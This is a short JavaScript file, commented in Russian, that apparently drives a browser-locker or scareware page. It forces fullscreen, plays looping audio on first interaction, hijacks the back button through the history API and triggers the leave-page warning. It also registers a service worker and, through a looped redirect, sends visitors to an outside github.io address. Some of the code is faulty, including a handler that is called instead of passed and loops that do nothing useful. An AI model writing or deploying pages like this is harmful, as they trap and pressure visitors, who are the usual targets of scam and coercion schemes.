let fullscreenActivated = false;
const audio = new Audio("zvuki.mp3");
audio.loop = true;

function startSound() {
   audio.play().catch(() => {});
  document.removeEventListener("mousemove", startSound);
  document.removeEventListener("click", startSound);
}

// Fullscreen после первого взаимодействия
function activateFullscreen() {
    if (!fullscreenActivated) {
        const el = document.documentElement;
        if (el.requestFullscreen) el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        fullscreenActivated = true;
        //document.getElementById("hint").style.display = "none";
    }
}

document.body.addEventListener("click", () => {
	activateFullscreen();
	startSound();
});
document.addEventListener("mousemove", startSound());
document.body.addEventListener("touchstart", activateFullscreen);

// Блокировка кнопки "Назад"
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
};

// Предупреждение при закрытии
window.addEventListener("beforeunload", (e) => {
	for(i=10000;i>0;i--) {
		e.preventDefault();
	}
});

// Регистрация service worker (для PWA)
if ("serviceWorker" in navigator) {
    navigator.serviceWorker.register("service-worker.js");
}

document.getElementById("go").addEventListener("click", () => {
  activateFullscreen();
  for(i=10000;i>0;i--) {
	location.href = "https://rsrchr1.github.io/uab/";
  }
});